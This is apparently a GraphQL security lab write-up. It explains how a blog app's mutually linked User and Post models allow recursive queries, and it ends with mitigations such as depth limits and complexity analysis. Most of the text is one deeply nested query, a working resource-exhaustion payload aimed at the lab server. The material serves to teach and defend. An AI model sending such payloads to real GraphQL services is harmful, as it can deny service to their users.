# GraphQL Resource Exhaustion


The application uses GraphQL to retrieve Users and Posts for the defdev.eu new blog. 

> Run the application 

```sh
docker build . -t graphql/dos && docker run -ti -p 5000:5000 graphql/dos
```

Great! Now the app is running. Browse to `http://0.0.0.0:5000/` 

## Discovery 


The application implements a small blog where only admin profiles can create posts. Non authenticated users can only read the latest posts. 

When we navigate to `http://0.0.0.0:5000/` the frontend asks the application for the latest posts using the GraphQL query

```
query: "{
	allPosts {
		edges {
			node {
				title 
				body 
				users 	
					{ username }
				}
			}
		}
	}"
```

The response will contain all the latest posts: 

```
{
  "data": {
    "allPosts": {
      "edges": [
        {
          "node": {
            "title": "Hello World",
            "body": "This is the first post of jhon",
            "users": {
              "username": "johndoe"
            }
          }
        },
        {
          "node": {
            "title": "Woooow",
            "body": "I'm the maaaaask",
            "users": {
              "username": "jimcarry"
            }
          }
        },
        {
          "node": {
            "title": "Second Post Jhon",
            "body": "This is the second post of jhon",
            "users": {
              "username": "johndoe"
            }
          }
        }
      ]
    }
  }
}
```

> What can go wrong here? 

If we look at the two classes `Users` and `Post`:


```
class User(db.Model):
    __tablename__ = 'users'
    uuid = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(256), index=True, unique=True)
    posts = db.relationship('Post', backref='users') ## HERE is the problem, that enables to create recursive queries
    
    def __repr__(self):
        return '<User %r>' % self.username
class Post(db.Model):
    __tablename__ = 'posts'
    uuid = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(256), index=True)
    body = db.Column(db.Text)
    author_id = db.Column(db.Integer, db.ForeignKey('users.uuid'))
    author = db.relationship('User', backref='post')
    
    def __repr__(self):
        return '<Post %r>' % self.title

```
we can see that each User can have multiple Post and each Post is assigned to an User. If we reflect this in GraphQL language, each posts node will have a user node that will have multiple posts node that will belong to a user that will ........... and so on.  So we are allowed to create nested querie.

## Exploitation 

> Let's exploit it!

If we craft a malicious payload like:

```
{
  allUsers {
    edges {
      node {
        username
        posts {
          edges {
            node {
              title
              authorId
              users {
                username
                posts {
                  edges {
                    node {
                      title
                      body
                      users {
                        username
                        uuid
                        username
                        uuid
                        posts {
                          edges {
                            node {
                              title
                              body
                              users {
                                username
                                posts {
                                  edges {
                                    node {
                                      title
                                      body
                                      users {
                                        posts {
                                          edges {
                                            node {
                                              users {
                                                posts {
                                                  edges {
                                                    node {
                                                      body
                                                      users {
                                                        posts {
                                                          edges {
                                                            node {
                                                              body
                                                              users {
                                                                posts {
                                                                  edges {
                                                                    node {
                                                                      body
                                                                      users {
                                                                        posts {
                                                                          edges {
                                                                            node {
                                                                              body
                                                                              users {
                                                                                posts {
                                                                                  edges {
                                                                                    node {
                                                                                      body
                                                                                      users {
                                                                                        posts {
                                                                                          edges {
                                                                                            node {
                                                                                              body
                                                                                              users {
                                                                                                posts {
                                                                                                  edges {
                                                                                                    node {
                                                                                                      body
                                                                                                      users {
                                                                                                        posts {
                                                                                                          edges {
                                                                                                            node {
                                                                                                              body
                                                                                                              users {
                                                                                                                posts {
                                                                                                                  edges {
                                                                                                                    node {
                                                                                                                      body
                                                                                                                      users {
                                                                                                                        posts {
                                                                                                                          edges {
                                                                                                                            node {
                                                                                                                              body
                                                                                                                              users {
                                                                                                                                posts {
                                                                                                                                  edges {
                                                                                                                                    node {
                                                                                                                                      body
                                                                                                                                      users {
                                                                                                                                        posts {
                                                                                                                                          edges {
                                                                                                                                            node {
                                                                                                                                              body
                                                                                                                                              users {
                                                                                                                                                posts {
                                                                                                                                                  edges {
                                                                                                                                                    node {
                                                                                                                                                      body
                                                                                                                                                      users {
                                                                                                                                                        posts {
                                                                                                                                                          edges {
                                                                                                                                                            node {
                                                                                                                                                              body
                                                                                                                                                              users {
                                                                                                                                                                posts {
                                                                                                                                                                  edges {
                                                                                                                                                                    node {
                                                                                                                                                                      body
                                                                                                                                                                      users {
                                                                                                                                                                        posts {
                                                                                                                                                                          edges {
                                                                                                                                                                            node {
                                                                                                                                                                              body
                                                                                                                                                                              users {
                                                                                                                                                                                posts {
                                                                                                                                                                                  edges {
                                                                                                                                                                                    node {
                                                                                                                                                                                      body
                                                                                                                                                                                      users {
                                                                                                                                                                                        posts {
                                                                                                                                                                                          edges {
                                                                                                                                                                                            node {
                                                                                                                                                                                              body
                                                                                                                                                                                              users {
                                                                                                                                                                                                posts {
                                                                                                                                                                                                  edges {
                                                                                                                                                                                                    node {
                                                                                                                                                                                                      body
                                                                                                                                                                                                      users {
                                                                                                                                                                                                        posts {
                                                                                                                                                                                                          edges {
                                                                                                                                                                                                            node {
                                                                                                                                                                                                              body
                                                                                                                                                                                                            }
                                                                                                                                                                                                          }
                                                                                                                                                                                                        }
                                                                                                                                                                                                      }
                                                                                                                                                                                                    }
                                                                                                                                                                                                  }
                                                                                                                                                                                                }
                                                                                                                                                                                              }
                                                                                                                                                                                            }
                                                                                                                                                                                          }
                                                                                                                                                                                        }
                                                                                                                                                                                      }
                                                                                                                                                                                    }
                                                                                                                                                                                  }
                                                                                                                                                                                }
                                                                                                                                                                              }
                                                                                                                                                                            }
                                                                                                                                                                          }
                                                                                                                                                                        }
                                                                                                                                                                      }
                                                                                                                                                                    }
                                                                                                                                                                  }
                                                                                                                                                                }
                                                                                                                                                              }
                                                                                                                                                            }
                                                                                                                                                          }
                                                                                                                                                        }
                                                                                                                                                      }
                                                                                                                                                    }
                                                                                                                                                  }
                                                                                                                                                }
                                                                                                                                              }
                                                                                                                                            }
                                                                                                                                          }
                                                                                                                                        }
                                                                                                                                      }
                                                                                                                                    }
                                                                                                                                  }
                                                                                                                                }
                                                                                                                              }
                                                                                                                            }
                                                                                                                          }
                                                                                                                        }
                                                                                                                      }
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

we can make the application explode, while trying to resolve all the possible queries. Each new query will add exponential complexity to our query.

## Fix 

To avoid DoS issues while still having nested queries, there are different possibilities: 

* Limit Maximum Query Depth
* Calculate Query Complexity
* Throttling Based on Server Time
* Audit your query before production

Few tools available online are:

* [https://www.npmjs.com/package/graphql-validation-complexity](https://www.npmjs.com/package/graphql-validation-complexity)
* [https://github.com/4Catalyzer/graphql-validation-complexity](https://github.com/4Catalyzer/graphql-validation-complexity)
* [https://github.com/slicknode/graphql-query-complexity](https://github.com/slicknode/graphql-query-complexity)





